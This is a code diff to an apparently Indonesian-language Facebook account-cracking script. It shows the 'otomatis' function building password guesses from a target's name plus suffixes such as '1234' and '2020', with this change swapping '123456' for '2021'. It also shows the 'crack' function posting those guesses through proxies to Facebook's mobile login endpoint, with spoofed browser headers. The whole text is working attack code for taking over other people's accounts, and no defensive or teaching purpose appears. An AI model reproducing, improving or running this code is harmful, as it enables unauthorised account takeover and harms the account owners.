@@ -593,7 +593,7 @@ def otomatis():
 					pwx.append(depan+"1234")
 					pwx.append(depan+"2020")
 					pwx.append(depan+"12345")
-					pwx.append(depan+"123456")
+					pwx.append(depan+"2021")
 			else:
 				if len(depan)<=1 or len(depan)<=2:
 					try:
@@ -605,7 +605,7 @@ def otomatis():
 							pwx.append(tengah+"1234")
 							pwx.append(tengah+"2020")
 							pwx.append(tengah+"12345")
-							pwx.append(tengah+"123456")
+							pwx.append(tengah+"2021")
 							pwx.append(nama)
 					except:
 						try:
@@ -616,7 +616,7 @@ def otomatis():
 								pwx.append(belakang+"1234")
 								pwx.append(belakang+"2020")
 								pwx.append(belakang+"12345")
-								pwx.append(belakang+"123456")
+								pwx.append(belakang+"2021")
 								pwx.append(nama)
 						except:pwx.append(nama)
 				else:
@@ -625,7 +625,7 @@ def otomatis():
 					pwx.append(depan+"1234")
 					pwx.append(depan+"2020")
 					pwx.append(depan+"12345")
-					pwx.append(depan+"123456")
+					pwx.append(depan+"2021")
 			if 'mobile' in metode:
 				babas.submit(crack,idf,pwx,"p.facebook.com",awal)
 			elif 'mbasic' in metode:
@@ -667,7 +667,7 @@ def crack(idf,pwx,url,awal):
 				"sec-fetch-mode":"cors",
 				"sec-fetch-dest":"empty",
 				"accept-encoding":"gzip, deflate br",
-				"accept-language":"en-US;q=0.9,en;q=0.8",
+				"accept-language":"en-GB,en-US;q=0.9,en;q=0.8",
 				"x-requested-with":"XMLHttpRequest",
 			}
 			bx = ses.post(f'https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100', headers=hd2, data=date, proxies=proxy)
